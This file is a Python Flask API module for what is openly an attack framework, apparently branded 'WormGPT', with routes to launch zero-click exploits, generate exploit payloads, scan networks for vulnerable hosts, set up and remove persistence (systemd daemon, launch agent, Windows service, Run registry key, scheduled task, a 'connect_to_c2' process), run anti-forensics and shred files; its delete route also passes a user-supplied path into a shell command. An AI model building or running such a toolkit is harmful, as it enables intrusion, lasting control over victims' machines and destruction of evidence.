import subprocess
import io
import json
import os
from flask import Blueprint, request, jsonify, send_file
from core.exploitation_manager import ExploitationManager
from core.persistence_manager import PersistenceManager
from core.antiforensics_manager import AntiforensicsManager

api_bp = Blueprint('api', __name__)

@api_bp.route('/api/exploitation/cve/update', methods=['POST'])
def update_cve_database():
    """Update the CVE database"""
    try:
        config = request.app.config
        exploitation_manager = ExploitationManager(config)
        
        success = exploitation_manager.update_cve_database()
        
        return jsonify({
            'success': success,
            'message': 'CVE database updated successfully' if success else 'Failed to update CVE database'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error updating CVE database: {str(e)}'
        }), 500

@api_bp.route('/api/exploitation/zero_click', methods=['POST'])
def execute_zero_click_exploit():
    """Execute a zero-click exploit"""
    try:
        data = request.json
        target_app = data.get('target_app')
        target_ip = data.get('target_ip')
        target_port = data.get('target_port')
        
        if not target_app:
            return jsonify({
                'success': False,
                'message': 'Target application is required'
            }), 400
            
        config = request.app.config
        exploitation_manager = ExploitationManager(config)
        
        success = exploitation_manager.execute_zero_click_exploit(target_app, target_ip, target_port)
        
        return jsonify({
            'success': success,
            'message': f'Zero-click exploit against {target_app} {"executed successfully" if success else "failed"}'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error executing zero-click exploit: {str(e)}'
        }), 500

@api_bp.route('/api/exploitation/payload', methods=['POST'])
def create_exploit_payload():
    """Create an exploit payload"""
    try:
        data = request.json
        target_app = data.get('target_app')
        payload_type = data.get('payload_type', 'pdf')
        
        if not target_app:
            return jsonify({
                'success': False,
                'message': 'Target application is required'
            }), 400
            
        config = request.app.config
        exploitation_manager = ExploitationManager(config)
        
        payload = exploitation_manager.create_exploit_payload(target_app, payload_type)
        
        if not payload:
            return jsonify({
                'success': False,
                'message': f'Failed to create payload for {target_app}'
            }), 500
            
        return jsonify({
            'success': True,
            'payload': payload
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error creating payload: {str(e)}'
        }), 500

@api_bp.route('/api/persistence/establish', methods=['POST'])
def establish_persistence():
    """Establish persistence on a target"""
    try:
        data = request.json
        session_id = data.get('session_id')
        
        if not session_id:
            return jsonify({
                'success': False,
                'message': 'Session ID is required'
            }), 400
            
        config = request.app.config
        persistence_manager = PersistenceManager(config)
        
        success = persistence_manager.establish_persistence(session_id)
        
        return jsonify({
            'success': success,
            'message': 'Persistence established successfully' if success else 'Failed to establish persistence'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error establishing persistence: {str(e)}'
        }), 500

@api_bp.route('/api/antiforensics/execute', methods=['POST'])
def execute_antiforensics():
    """Execute antiforensics techniques"""
    try:
        config = request.app.config
        antiforensics_manager = AntiforensicsManager(config)
        
        success = antiforensics_manager.execute_antiforensics()
        
        return jsonify({
            'success': success,
            'message': 'Antiforensics techniques executed successfully' if success else 'Failed to execute antiforensics techniques'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error executing antiforensics: {str(e)}'
        }), 500

@api_bp.route('/api/antiforensics/decoy', methods=['POST'])
def create_decoy_files():
    """Create decoy files to distract forensic analysis"""
    try:
        data = request.json
        target_dir = data.get('target_dir')
        count = data.get('count', 10)
        
        if not target_dir:
            return jsonify({
                'success': False,
                'message': 'Target directory is required'
            }), 400
            
        config = request.app.config
        antiforensics_manager = AntiforensicsManager(config)
        
        success = antiforensics_manager.create_decoy_files(target_dir, count)
        
        return jsonify({
            'success': success,
            'message': f'Decoy files created successfully in {target_dir}'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error creating decoy files: {str(e)}'
        }), 500

@api_bp.route('/api/exploitation/cve/list', methods=['GET'])
def list_cve_database():
    """List all CVEs in the database"""
    try:
        config = request.app.config
        exploitation_manager = ExploitationManager(config)
        
        return jsonify({
            'success': True,
            'cve_database': exploitation_manager.cve_db
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error listing CVE database: {str(e)}'
        }), 500

@api_bp.route('/api/exploitation/cve/search', methods=['POST'])
def search_cve_database():
    """Search CVEs by target application"""
    try:
        data = request.json
        target_app = data.get('target_app')
        
        if not target_app:
            return jsonify({
                'success': False,
                'message': 'Target application is required'
            }), 400
            
        config = request.app.config
        exploitation_manager = ExploitationManager(config)
        
        exploits = exploitation_manager.get_exploit_for_target(target_app)
        
        return jsonify({
            'success': True,
            'exploits': exploits
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error searching CVE database: {str(e)}'
        }), 500

@api_bp.route('/api/exploitation/cve/add', methods=['POST'])
def add_cve_to_database():
    """Add a new CVE to the database"""
    try:
        data = request.json
        cve_id = data.get('cve_id')
        description = data.get('description')
        target_app = data.get('target_app')
        exploit_available = data.get('exploit_available', False)
        exploit_path = data.get('exploit_path')
        severity = data.get('severity', 'medium')
        
        if not cve_id or not description or not target_app:
            return jsonify({
                'success': False,
                'message': 'CVE ID, description, and target application are required'
            }), 400
            
        config = request.app.config
        exploitation_manager = ExploitationManager(config)
        
        # Add CVE to database
        exploitation_manager.cve_db[cve_id] = {
            'description': description,
            'target_app': target_app,
            'exploit_available': exploit_available,
            'exploit_path': exploit_path,
            'severity': severity
        }
        
        # Save database
        with open(exploitation_manager.cve_db_path, 'w') as f:
            json.dump(exploitation_manager.cve_db, f)
            
        return jsonify({
            'success': True,
            'message': f'CVE {cve_id} added to database successfully'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error adding CVE to database: {str(e)}'
        }), 500

@api_bp.route('/api/persistence/status', methods=['POST'])
def check_persistence_status():
    """Check persistence status for a session"""
    try:
        data = request.json
        session_id = data.get('session_id')
        
        if not session_id:
            return jsonify({
                'success': False,
                'message': 'Session ID is required'
            }), 400
            
        config = request.app.config
        persistence_manager = PersistenceManager(config)
        
        # Check for persistence mechanisms
        status = {
            'daemon': False,
            'cross_process': False,
            'firmware_level': False,
            'bootkit': False
        }
        
        # Check for daemon persistence
        if persistence_manager.system == 'linux':
            try:
                result = subprocess.run(['systemctl', 'is-enabled', persistence_manager.persistence_config.get('daemon', 'com.wormgpt.agent')], 
                                       capture_output=True, text=True)
                status['daemon'] = result.returncode == 0
            except:
                pass
        elif persistence_manager.system == 'darwin':
            try:
                daemon_name = persistence_manager.persistence_config.get('daemon', 'com.wormgpt.agent')
                result = subprocess.run(['launchctl', 'list', daemon_name], capture_output=True, text=True)
                status['daemon'] = result.returncode == 0
            except:
                pass
        elif persistence_manager.system == 'windows':
            try:
                service_name = persistence_manager.persistence_config.get('daemon', 'com.wormgpt.agent')
                result = subprocess.run(['sc', 'query', service_name], capture_output=True, text=True)
                status['daemon'] = result.returncode == 0
            except:
                pass
                
        # Check for cross-process persistence
        if persistence_manager.system == 'linux':
            try:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                status['cross_process'] = 'python3' in result.stdout and 'connect_to_c2' in result.stdout
            except:
                pass
        elif persistence_manager.system == 'windows':
            try:
                result = subprocess.run(['tasklist', '/v'], capture_output=True, text=True)
                status['cross_process'] = 'python.exe' in result.stdout and 'requests' in result.stdout
            except:
                pass
                
        # Check for firmware-level persistence (Linux only)
        if persistence_manager.system == 'linux':
            try:
                result = subprocess.run(['systemctl', 'is-enabled', 'boot-persistence'], capture_output=True, text=True)
                status['firmware_level'] = result.returncode == 0
            except:
                pass
                
        # Check for bootkit persistence (Windows only)
        if persistence_manager.system == 'windows':
            try:
                result = subprocess.run(['bcdedit', '/enum'], capture_output=True, text=True)
                status['bootkit'] = 'boot_persistence' in result.stdout
            except:
                pass
                
        return jsonify({
            'success': True,
            'status': status
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error checking persistence status: {str(e)}'
        }), 500

@api_bp.route('/api/antiforensics/decoy/download', methods=['POST'])
def download_decoy_file():
    """Download a decoy file for testing"""
    try:
        data = request.json
        file_type = data.get('file_type', 'pdf')
        
        if file_type == 'pdf':
            # Create a PDF decoy file
            pdf_content = """
            %PDF-1.4
            1 0 obj
            << /Type /Catalog /Pages 2 0 R >>
            endobj
            2 0 obj
            << /Type /Pages /Kids [3 0 R] /Count 1 >>
            endobj
            3 0 obj
            << /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /MediaBox [0 0 612 792] /Contents 5 0 R >>
            endobj
            4 0 obj
            << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
            endobj
            5 0 obj
            << /Length 44 >>
            stream
            BT /F1 12 Tf 72 720 Td (Decoy File) Tj ET
            endstream
            endobj
            xref
            0 6
            0000000000 65535 f 
            0000000009 00000 n 
            0000000058 00000 n 
            0000000115 00000 n 
            0000000225 00000 n 
            0000000284 00000 n 
            trailer
            << /Size 6 /Root 1 0 R >>
            startxref
            376
            %%EOF
            """
            
            return send_file(
                io.BytesIO(pdf_content.encode()),
                mimetype='application/pdf',
                as_attachment=True,
                download_name='decoy_document.pdf'
            )
        elif file_type == 'doc':
            # Create a DOC decoy file
            doc_content = """
            <html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns="http://www.w3.org/TR/REC-html40">
            <head><meta charset="utf-8"><title>Decoy Document</title></head>
            <body><p>This is a decoy document.</p></body>
            </html>
            """
            
            return send_file(
                io.BytesIO(doc_content.encode()),
                mimetype='application/msword',
                as_attachment=True,
                download_name='decoy_document.doc'
            )
        else:
            return jsonify({
                'success': False,
                'message': f'Unsupported file type: {file_type}'
            }), 400
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error downloading decoy file: {str(e)}'
        }), 500

@api_bp.route('/api/antiforensics/secure_delete', methods=['POST'])
def secure_delete_file():
    """Securely delete a file"""
    try:
        data = request.json
        file_path = data.get('file_path')
        
        if not file_path:
            return jsonify({
                'success': False,
                'message': 'File path is required'
            }), 400
            
        if not os.path.exists(file_path):
            return jsonify({
                'success': False,
                'message': 'File does not exist'
            }), 400
            
        config = request.app.config
        antiforensics_manager = AntiforensicsManager(config)
        
        if antiforensics_manager.system == 'nt':  # Windows
            # Use cipher to securely delete on Windows
            delete_cmd = f'cipher /w "{file_path}"'
            subprocess.run(delete_cmd, shell=True)
            os.remove(file_path)
        else:  # Unix-like systems
            # Use shred to securely delete on Unix
            delete_cmd = f'shred -u "{file_path}"'
            subprocess.run(delete_cmd, shell=True)
            
        return jsonify({
            'success': True,
            'message': f'File securely deleted: {file_path}'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error securely deleting file: {str(e)}'
        }), 500

@api_bp.route('/api/exploitation/targets/scan', methods=['POST'])
def scan_for_targets():
    """Scan the network for vulnerable targets"""
    try:
        data = request.json
        network_range = data.get('network_range', '192.168.1.0/24')
        
        if not network_range:
            return jsonify({
                'success': False,
                'message': 'Network range is required'
            }), 400
            
        config = request.app.config
        exploitation_manager = ExploitationManager(config)
        
        # Scan for targets
        targets = exploitation_manager.scan_network(network_range)
        
        return jsonify({
            'success': True,
            'targets': targets
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error scanning for targets: {str(e)}'
        }), 500

@api_bp.route('/api/exploitation/targets/vulnerabilities', methods=['POST'])
def check_target_vulnerabilities():
    """Check a target for vulnerabilities"""
    try:
        data = request.json
        target_ip = data.get('target_ip')
        target_port = data.get('target_port')
        
        if not target_ip:
            return jsonify({
                'success': False,
                'message': 'Target IP is required'
            }), 400
            
        config = request.app.config
        exploitation_manager = ExploitationManager(config)
        
        # Check for vulnerabilities
        vulnerabilities = exploitation_manager.check_vulnerabilities(target_ip, target_port)
        
        return jsonify({
            'success': True,
            'vulnerabilities': vulnerabilities
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error checking target vulnerabilities: {str(e)}'
        }), 500

@api_bp.route('/api/persistence/remove', methods=['POST'])
def remove_persistence():
    """Remove persistence mechanisms"""
    try:
        data = request.json
        session_id = data.get('session_id')
        mechanisms = data.get('mechanisms', ['daemon', 'cross_process', 'firmware_level', 'bootkit'])
        
        if not session_id:
            return jsonify({
                'success': False,
                'message': 'Session ID is required'
            }), 400
            
        config = request.app.config
        persistence_manager = PersistenceManager(config)
        
        success = True
        
        # Remove daemon persistence
        if 'daemon' in mechanisms:
            try:
                if persistence_manager.system == 'linux':
                    daemon_name = persistence_manager.persistence_config.get('daemon', 'com.wormgpt.agent')
                    subprocess.run(['systemctl', 'stop', daemon_name], check=True)
                    subprocess.run(['systemctl', 'disable', daemon_name], check=True)
                    os.remove(f"/etc/systemd/system/{daemon_name}.service")
                    subprocess.run(['systemctl', 'daemon-reload'], check=True)
                elif persistence_manager.system == 'darwin':
                    daemon_name = persistence_manager.persistence_config.get('daemon', 'com.wormgpt.agent')
                    user = os.environ.get('USER')
                    plist_path = f"/Users/{user}/Library/LaunchAgents/{daemon_name}.plist"
                    subprocess.run(['launchctl', 'unload', plist_path], check=True)
                    os.remove(plist_path)
                elif persistence_manager.system == 'windows':
                    service_name = persistence_manager.persistence_config.get('daemon', 'com.wormgpt.agent')
                    subprocess.run(['sc', 'stop', service_name], check=True)
                    subprocess.run(['sc', 'delete', service_name], check=True)
            except:
                success = False
                
        # Remove cross-process persistence
        if 'cross_process' in mechanisms:
            try:
                if persistence_manager.system == 'linux':
                    # Kill processes with our injection code
                    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if 'connect_to_c2' in line:
                            pid = line.split()[1]
                            subprocess.run(['kill', '-9', pid], check=True)
                elif persistence_manager.system == 'windows':
                    # Kill processes with our injection code
                    result = subprocess.run(['tasklist', '/v'], capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if 'requests' in line and 'python.exe' in line:
                            parts = line.split()
                            if len(parts) >= 2:
                                pid = parts[1]
                                subprocess.run(['taskkill', '/F', '/PID', pid], check=True)
            except:
                success = False
                
        # Remove firmware-level persistence (Linux only)
        if 'firmware_level' in mechanisms and persistence_manager.system == 'linux':
            try:
                subprocess.run(['systemctl', 'stop', 'boot-persistence'], check=True)
                subprocess.run(['systemctl', 'disable', 'boot-persistence'], check=True)
                os.remove("/etc/systemd/system/boot-persistence.service")
                os.remove("/usr/local/bin/boot_persistence.sh")
                subprocess.run(['systemctl', 'daemon-reload'], check=True)
            except:
                success = False
                
        # Remove bootkit persistence (Windows only)
        if 'bootkit' in mechanisms and persistence_manager.system == 'windows':
            try:
                # Remove from registry
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "BootPersistence")
                winreg.CloseKey(key)
                
                # Remove from task scheduler
                subprocess.run(['schtasks', '/delete', '/tn', 'BootPersistence', '/f'], check=True)
                
                # Remove boot script
                script_path = "C:\\Windows\\System32\\boot_persistence.bat"
                if os.path.exists(script_path):
                    os.remove(script_path)
            except:
                success = False
                
        return jsonify({
            'success': success,
            'message': 'Persistence mechanisms removed successfully' if success else 'Failed to remove some persistence mechanisms'
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Error removing persistence mechanisms: {str(e)}'
        }), 500
